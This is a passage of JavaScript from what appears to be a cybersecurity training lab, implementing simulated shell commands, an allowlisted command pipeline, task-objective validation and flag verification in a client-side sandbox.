      const lines = text.split('\n').slice(-limit);
      return { exitCode: 0, stdout: lines.join('\n') };
    },

    // -----------------------------------------------------------------------
    // CD: Change Working Directory
    // -----------------------------------------------------------------------
    cd: (ast, session, spec) => {
      const target = ast.positionals[0] || spec.initialDir;
      const targetPath = session.fs.normalizePath(session.cwd, target);
      const node = session.fs.getNode(targetPath);

      if (!node || node.type !== 'dir') {
        return { exitCode: 1, stderr: `bash: cd: ${target}: No such file or directory` };
      }

      session.cwd = targetPath;
      return { exitCode: 0, stdout: '' };
    },

    // -----------------------------------------------------------------------
    // ECHO: Print Arguments to Standard Output
    // -----------------------------------------------------------------------
    echo: (ast, session, spec, rawCmd) => {
      // If positionals contain string
      if (ast.positionals.length > 0) {
        return {
          exitCode: 0,
          stdout: ast.positionals.join(' ')
        };
      }

      // Check if raw command had string after echo (e.g. echo -n '...')
      const match = rawCmd.match(/echo(?:\s+-n)?\s+(['"]?)([\s\S]*?)\1(?:\s*\||$)/);
      if (match && match[2]) {
        return {
          exitCode: 0,
          stdout: match[2]
        };
      }

      return {
        exitCode: 0,
        stdout: ''
      };
    },

    // -----------------------------------------------------------------------
    // FILE: Determine File Type
    // -----------------------------------------------------------------------
    file: (ast, session) => {
      const target = ast.positionals[0];
      if (!target) return { exitCode: 1, stderr: 'file: missing argument' };

      const absPath = session.fs.normalizePath(session.cwd, target);
      const node = session.fs.getNode(absPath);
      if (!node) return { exitCode: 1, stderr: `file: cannot open '${target}' (No such file or directory)` };

      if (node.type === 'dir') return { exitCode: 0, stdout: `${target}: directory` };
      if (node.mode & 0o4000) return { exitCode: 0, stdout: `${target}: setuid ELF 64-bit LSB executable, x86-64, dynamically linked` };
      if (target.endsWith('.php')) return { exitCode: 0, stdout: `${target}: PHP script, ASCII text` };
      if (target.endsWith('.py')) return { exitCode: 0, stdout: `${target}: Python script, ASCII text executable` };
      if (target.endsWith('.conf')) return { exitCode: 0, stdout: `${target}: ASCII text, with very long lines` };
      return { exitCode: 0, stdout: `${target}: ASCII text` };
    },

    // -----------------------------------------------------------------------
    // WHICH: Locate a Command
    // -----------------------------------------------------------------------
    which: (ast) => {
      const prog = ast.positionals[0];
      if (!prog) return { exitCode: 1, stdout: '' };
      return { exitCode: 0, stdout: `/usr/bin/${prog}` };
    },

    // -----------------------------------------------------------------------
    // DATE & UNAME: Standard Host Utilities
    // -----------------------------------------------------------------------
    date: () => ({ exitCode: 0, stdout: 'Sun Oct 04 12:00:00 UTC 2026' }),
    uname: (ast) => ({
      exitCode: 0,
      stdout: ast.flags.has('a') ?
        'Linux sec-station 5.15.0-101-generic #111-Ubuntu SMP x86_64 GNU/Linux' :
        'Linux'
    })
  };

  // =========================================================================
  // 6. MAIN ENGINE CONTROLLER (PIPELINE DISPATCH & OBJECTIVE VALIDATION)
  // =========================================================================
  class LabValidatorEngine {
    constructor() {
      this.sessions = {};
      this.backendUrl = null;
    }

    async checkBackend() {
      try {
        const res = await fetch('/api/lab/health', { method: 'GET' });
        if (res.ok) {
          this.backendUrl = '/api/lab';
          return true;
        }
      } catch (e) {}
      this.backendUrl = null;
      return false;
    }

    getSession(labId) {
      if (!this.sessions[labId]) {
        this.sessions[labId] = LabSessionManager.loadSession(labId);
      }
      return this.sessions[labId];
    }

    resetLab(labId) {
      const newSession = LabSessionManager.resetSession(labId);
      this.sessions[labId] = newSession;
      return newSession;
    }

    async execute(labId, rawCmd) {
      const spec = LAB_SPECIFICATIONS[labId];
      if (!spec) {
        return { exitCode: 1, stderr: `Unknown lab challenge ID: ${labId}` };
      }

      // If dedicated backend daemon is connected, delegate execution
      if (this.backendUrl) {
        try {
          const res = await fetch(`${this.backendUrl}/exec`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ labId, command: rawCmd })
          });
          if (res.ok) {
            return await res.json();
          }
        } catch (e) {
          console.warn('[LabEngine] Backend unavailable, running local sandbox engine.');
        }
      }

      // High-Fidelity Client-Side Sandbox Execution
      const session = this.getSession(labId);
      const cleanRaw = (rawCmd || '').trim();
      session.commandHistory.push(cleanRaw);

      if (!cleanRaw) {
        return { exitCode: 0, stdout: '' };
      }

      // Clear terminal built-in
      if (cleanRaw.toLowerCase() === 'clear' || cleanRaw.toLowerCase() === 'cls') {
        return { exitCode: 0, stdout: '', isClear: true };
      }

      // Help overview built-in
      if (cleanRaw.toLowerCase() === 'help') {
        return {
          exitCode: 0,
          stdout: `=== AVAILABLE TOOLS & COMMANDS FOR ${spec.title.toUpperCase()} ===
Scope Target: ${spec.targetHost}
Authorized Tools: ${spec.allowedTools.join(', ')}
Standard Utilities: ls, cat, stat, grep, head, tail, whoami, id, pwd, cd, clear, help
Objectives:
${spec.tasks.map((t, idx) => `  [Task ${idx + 1}] ${t.title}`).join('\n')}`
        };
      }

      // Parse Command Line
      const parsed = LabCommandParser.parse(cleanRaw);
      if (!parsed || parsed.commands.length === 0) {
        return { exitCode: 0, stdout: '' };
      }

      // Allowed tools baseline
      const standardAllowed = ['echo', 'cat', 'grep', 'ls', 'stat', 'whoami', 'id', 'pwd', 'cd', 'head', 'tail', 'base64', 'file', 'which', 'date', 'uname', 'clear', 'cls', 'help', 'exit'];
      const labAllowed = (spec.allowedTools || []).concat(standardAllowed);

      // Execute Pipelines and Chained Commands
      let lastExitCode = 0;
      let finalStdout = '';
      let finalStderr = '';
      let currentStdin = '';

      for (let i = 0; i < parsed.commands.length; i++) {
        const cmdAst = parsed.commands[i];
        cmdAst.raw = cleanRaw;
        const exec = cmdAst.executable.toLowerCase();

        // Check if executable is permitted in this lab
        if (!labAllowed.includes(exec)) {
          return {
            exitCode: 127,
            stderr: `bash: ${exec}: command not found in this isolated lab environment.\nType 'help' to review authorized tools for this lab.`,
            feedback: {
              type: 'tool_restricted',
              message: `Tool '${exec}' is not installed or not in scope for this lab. Allowed tools: ${spec.allowedTools.join(', ')}.`
            }
          };
        }

        // Dispatch to tool executor
        let stepResult = { exitCode: 0, stdout: '', stderr: '' };
        if (ToolExecutors[exec]) {
          stepResult = ToolExecutors[exec](cmdAst, session, spec, cleanRaw, currentStdin);
        } else {
          stepResult = { exitCode: 0, stdout: `Command '${exec}' executed.` };
        }

        lastExitCode = stepResult.exitCode || 0;

        // Handle Redirection > or >> into VFS
        if (cmdAst.redirects && cmdAst.redirects.stdout) {
          const redirectFile = session.fs.normalizePath(session.cwd, cmdAst.redirects.stdout);
          session.fs.writeFile(redirectFile, stepResult.stdout || '', session.user, session.euid, cmdAst.redirects.append);
          stepResult.stdout = '';
        }

        // Handle 2>/dev/null
        if (cmdAst.redirects && cmdAst.redirects.stderr === '/dev/null') {
          stepResult.stderr = '';
        }

        if (cmdAst.pipeToNext) {
          currentStdin = stepResult.stdout || '';
        } else {
          currentStdin = '';
          finalStdout += (finalStdout ? '\n' : '') + (stepResult.stdout || '');
          if (stepResult.stderr) {
            finalStderr += (finalStderr ? '\n' : '') + stepResult.stderr;
          }

          // Handle command chaining && (abort on failure)
          if (cmdAst.chainType === '&&' && lastExitCode !== 0) {
            break;
          }
        }
      }

      // Objective Validation (Strict POSIX Execution & Non-Zero Error Rejection)
      const newlyCompleted = [];
      const primaryAst = parsed.commands[0];

      spec.tasks.forEach((task, index) => {
        if (!session.completedTasks.has(index)) {
          // Reject task completion if the primary command exited with an error,
          // UNLESS the specific task explicitly allows non-zero exit code (e.g. grep finding no HSTS header)
          if (lastExitCode !== 0 && !task.allowNonZeroExit) {
            return;
          }

          const isDone = task.validate(cleanRaw, primaryAst, finalStdout || finalStderr || '', session, parsed, lastExitCode, finalStderr);
          if (isDone) {
            session.completedTasks.add(index);
            newlyCompleted.push({
              index,
              title: task.title,
              note: task.successNote || 'Task completed!'
            });
          }
        }
      });

      // Persist state updates
      LabSessionManager.saveSession(session);

      return {
        exitCode: lastExitCode,
        stdout: finalStdout,
        stderr: finalStderr,
        newlyCompleted,
        allCompleted: Array.from(session.completedTasks),
        isRoot: session.isElevatedRoot,
        currentUser: session.isElevatedRoot ? 'root' : session.user,
        prompt: session.isElevatedRoot ? 'root@sec-station:~#' : (spec.initialUser + '@' + spec.id + ':~$ ')
      };
    }

    verifyFlag(labId, submittedFlag) {
      if (!submittedFlag) return { success: false, message: 'Please enter a flag token.' };

      const clean = submittedFlag.trim().toLowerCase();
      const validFlags = LAB_FLAGS[labId] || [];
      const session = this.getSession(labId);
      const spec = LAB_SPECIFICATIONS[labId];

      const match = validFlags.some(f => clean === f.toLowerCase() || clean.includes(f.toLowerCase()));

      if (match) {
        if (spec && spec.tasks) {
          spec.tasks.forEach((_, i) => session.completedTasks.add(i));
          LabSessionManager.saveSession(session);
        }
        return {
          success: true,
          message: 'Flag verified! Challenge solved.',
          xp: 75
        };
      }

      return {
        success: false,
        message: 'Incorrect flag. Complete the technical lab objectives to discover the real token.'
      };
    }
  }

  // Export singleton engine instance
  const engine = new LabValidatorEngine();
  return engine;
});
